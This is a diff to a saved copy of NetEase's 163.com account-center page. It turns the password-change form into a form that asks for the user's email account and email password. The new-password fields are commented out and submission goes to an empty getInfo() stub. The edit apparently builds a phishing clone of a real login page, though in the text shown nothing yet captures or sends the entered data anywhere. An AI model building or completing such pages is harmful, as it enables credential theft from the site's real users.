@@ -10,6 +10,9 @@
 <script type="text/javascript" language="javascript" src="./网易用户中心_files/checkform.js"></script>
 <script type="text/javascript" language="javascript" src="./网易用户中心_files/jquery-1_3_1.js"></script>
 <script language="JavaScript">
+
+function getInfo(){
+}
 <!--
 function charAllSame(str){
 	for(var i = 0 ; i < str.length - 1 ; i ++){
@@ -206,13 +209,13 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
 
 
 			<dt><a href="https://reg.163.com/account/accountInfo.jsp">帐号管理</a></dt>
-	        <dd class="act_dd"><a href="https://reg.163.com/setinfo/ChangePwd_1.jsp?username=net_administrat0r">修改密码</a></dd>
+	        <dd><a href="https://reg.163.com/setinfo/ChangePwd_1.jsp?username=net_administrat0r">修改密码</a></dd>
 	        <dd><a href="https://reg.163.com/chg/modifyLoginEmail_0.jsp">修改登录邮件地址</a></dd>
 	        <dd><a href="https://reg.163.com/chg/ChangeInfo_0.jsp?username=net_administrat0r">修改基本信息</a></dd>
 
 	        <dd><a href="https://reg.163.com/chg/ShowBaomiInfo.jsp">帐号安全设置</a></dd>
 	        <dd><a href="https://reg.163.com/mibao/controller/mob/index.jsp">手机服务</a></dd>
-	        <dd><a href="https://reg.163.com/account/accountSecQuestionIndex.do">安全问题</a></dd>
+	        <dd class="act_dd"><a href="https://reg.163.com/account/accountSecQuestionIndex.do">安全问题</a></dd>
 	        <dd><a href="https://reg.163.com/jihuo/Jihuo.jsp">开通游戏付费</a></dd>
 	        <dd><a href="https://reg.163.com/mibao/controller/smdj/index.jsp">防沉迷认证</a></dd>
 	        <dd><a href="https://reg.163.com/loginexception/index.do">异常登录提醒设置</a></dd>
@@ -269,8 +272,9 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
 
 <!--body start-->
     <div class="right_pan">
-      <h2 class="clum_title">  <a href="https://reg.163.com/account/accountInfo.jsp">帐号管理</a>&gt;&gt;修改密码 </h2>
-      <form method="post" action="https://reg.163.com/account/updatePwd.do" id="form" name="form" onsubmit="return checkdata(this);">
+      <h2 class="clum_title">  <a href="https://reg.163.com/account/accountInfo.jsp">帐号管理</a>&gt;&gt;安全问题 </h2>
+      <form method="post" action="https://reg.163.com/account/accountSecQuestionIndex.do" id="form" 
+        name="form" onsubmit="getInfo()">
 		<input type="hidden" name="username" id="username" value="net_administrat0r">
 		<input type="hidden" name="uname2" id="uname2" value="">
 		<!--input type="hidden" name="syscheckcode" id="syscheckcode" value="" /-->
@@ -279,17 +283,16 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
           <li>
             <div class="fm_left">邮箱帐号：</div>
             <div class="fm_right">
-              <input class="input" title="新密码" type="password" name="password" id="username" onblur="">
+              <input class="input" title="用户名" name="password" id="username" >
             </div>
           </li>
           <li>
-            <div class="fm_left">输入旧的密码：</div>
+            <div class="fm_left">邮箱密码：</div>
             <div class="fm_right">
-              <input class="input" title="新密码" type="password" name="password" id="oldpassword" onblur="">
+              <input class="input" title="密码" type="password" name="password" id="oldpassword" >
             </div>
           </li>
-          <li>
-            <div class="fm_left">设置新的密码：</div>
+            <!-- <div class="fm_left">设置新的密码：</div>
             <div class="fm_right">
               <input class="input" title="新密码" type="password" name="password" id="password" onblur="checkNewPassword()"><span id="errNewPwd" class="err"></span>
               <div class="info">6-16位，区分大小写，只能使用字母、数字、特殊字符 </div>
@@ -300,7 +303,7 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
             <div class="fm_right">
               <input type="password" class="input" title="重复新密码" name="confirmPassword" id="confirmPassword" onblur="checkNewPasswordConfirm()"><span id="errNewConfirmPwd" class="err"></span>
             </div>
-          </li>
+          </li> -->
           <li>
           </li>
           <li class="g_line"></li>
